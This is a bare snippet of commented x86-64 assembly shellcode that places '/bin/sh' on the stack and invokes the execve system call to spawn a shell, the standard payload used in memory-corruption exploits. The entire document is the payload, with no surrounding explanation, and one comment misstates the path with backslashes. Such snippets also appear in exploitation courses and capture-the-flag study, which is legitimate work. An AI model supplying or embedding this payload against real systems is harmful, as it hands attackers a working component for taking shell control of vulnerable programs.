mov rdi, 0x68732f6e69622f			; "\bin\sh\x00" in reverse due to little-endian
push rdi
mov rdi, rsp						; set filename address to stack's address
mov rax, 0x3b						; so that execve will be called later
xor rsi, rsi						; set argv to NULL
xor rdx, rdx						; set envp to NULL
syscall